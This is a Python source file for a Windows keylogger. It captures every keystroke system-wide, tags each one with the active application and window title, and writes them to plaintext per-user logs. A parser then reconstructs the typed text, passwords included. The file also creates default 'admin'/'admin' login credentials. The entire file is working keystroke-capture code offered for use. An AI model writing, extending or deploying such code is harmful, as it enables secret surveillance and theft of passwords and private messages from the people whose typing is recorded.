# keylogger.py
import keyboard
from pynput.keyboard import Listener, Key
import os
import json
import bcrypt
import win32gui
import win32process
import psutil
from datetime import datetime
import logging

# Paths and Default Configurations
CONFIG_FILE = "config.json"
CREDENTIALS_FILE = "credentials.json"
DEBUG_LOG_FILE = "debug_log.log"  # Separate debug log file

# Configure logging
logging.basicConfig(
    filename=DEBUG_LOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
)

def load_credentials():
    """Load or initialize login credentials."""
    try:
        if not os.path.exists(CREDENTIALS_FILE):
            # Initialize with default credentials
            DEFAULT_CREDENTIALS = {
                "username": "admin",
                "password": bcrypt.hashpw("admin".encode(), bcrypt.gensalt()).decode(),
            }
            with open(CREDENTIALS_FILE, "w") as file:
                json.dump(DEFAULT_CREDENTIALS, file)
            logging.info("Default credentials created.")
        with open(CREDENTIALS_FILE, "r") as file:
            credentials = json.load(file)
        logging.info("Credentials loaded successfully.")
        return credentials
    except Exception as e:
        logging.error(f"Error loading credentials: {e}")
        raise

def save_credentials(username, password):
    """Save updated credentials with encrypted password."""
    try:
        hashed_password = bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()
        with open(CREDENTIALS_FILE, "w") as file:
            json.dump({"username": username, "password": hashed_password}, file)
        logging.info("Credentials updated successfully.")
    except Exception as e:
        logging.error(f"Error saving credentials: {e}")
        raise

def load_config():
    """Load or initialize configuration."""
    try:
        if not os.path.exists(CONFIG_FILE):
            logging.error("Configuration file not found. Please run the setup script first.")
            exit(1)
        with open(CONFIG_FILE, "r") as file:
            config = json.load(file)
        logging.info("Configuration loaded successfully.")
        return config
    except Exception as e:
        logging.error(f"Error loading configuration: {e}")
        raise

def save_config(config):
    """Save updated configuration."""
    try:
        with open(CONFIG_FILE, "w") as file:
            json.dump(config, file)
        logging.info("Configuration saved successfully.")
    except Exception as e:
        logging.error(f"Error saving configuration: {e}")
        raise

def get_active_window_title():
    """Retrieve the title of the currently active window."""
    try:
        hwnd = win32gui.GetForegroundWindow()
        window_title = win32gui.GetWindowText(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        process = psutil.Process(pid)
        process_name = process.name()
        full_title = f"{process_name} - {window_title}"
        logging.debug(f"Active window: {full_title}")
        return full_title
    except Exception as e:
        logging.error(f"Error retrieving active window title: {e}")
        return "Unknown Application"

def log_event(log_directory, username, event):
    """Log an event for the current session."""
    try:
        log_file = os.path.join(log_directory, f"{username}_session.log")
        with open(log_file, "a") as file:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            file.write(f"[{timestamp}] {event}\n")
        logging.debug(f"Logged event: {event}")
    except Exception as e:
        logging.error(f"Error logging event '{event}': {e}")

def parse_keystrokes(log_file):
    """Parse keystrokes from the raw log file into a horizontal, readable format."""
    parsed_output = []
    try:
        with open(log_file, "r") as file:
            raw_keystrokes = file.readlines()

        buffer = ""
        current_app = ""
        for line in raw_keystrokes:
            if "Keystroke:" in line:
                _, event = line.strip().split("] ", 1)
                key = event.replace("Keystroke: ", "").strip()
                if key.startswith("Key."):
                    special_key = key.replace("Key.", "").lower()
                    if special_key == "space":
                        buffer += " "
                    elif special_key == "enter":
                        buffer += "\n"
                    elif special_key == "backspace":
                        buffer = buffer[:-1]  # Simulate backspace by removing the last character
                    else:
                        buffer += f"[{special_key}]"
                else:
                    buffer += key
            elif "Application:" in line:
                _, app = line.strip().split(": ", 1)
                current_app = app.strip()
                buffer += f"\n[{current_app}]\n"
        parsed_output.append(buffer)
    except Exception as e:
        logging.error(f"Error parsing log file '{log_file}': {e}")
        return f"Error parsing log file: {e}"

    return "\n".join(parsed_output)

def start_keylogger(log_directory, username):
    """Start the keylogger to capture keystrokes and log them."""
    try:
        log_file = os.path.join(log_directory, f"{username}_session.log")
        logging.info(f"Starting keylogger for user: {username}, logging to: {log_file}")

        # If the log file does not exist, create it and log the session start
        if not os.path.exists(log_file):
            with open(log_file, "w") as file:
                file.write(f"Log file created for user: {username}\n")
            log_event(log_directory, username, "Session Started")

        def on_press(key):
            try:
                key_char = key.char
            except AttributeError:
                key_char = f"Key.{key.name}"
            event = f"Keystroke: {key_char}"
            log_event(log_directory, username, event)

            # Log the active application
            active_app = get_active_window_title()
            log_event(log_directory, username, f"Application: {active_app}")

        def on_release(key):
            if key == Key.esc:
                log_event(log_directory, username, "Session Ended")
                logging.info(f"Keylogger stopped for user: {username}.")
                print(f"Keylogger stopped for user: {username}.")
                return False

        print(f"Keylogger running for user: {username}. Logs are saved in: {log_file}")
        logging.info(f"Keylogger running for user: {username}.")

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        logging.error(f"Error in start_keylogger: {e}")

if __name__ == "__main__":
    try:
        config = load_config()
        credentials = load_credentials()
        start_keylogger(config["log_directory"], credentials["username"])
    except Exception as e:
        logging.critical(f"Critical error in main execution: {e}")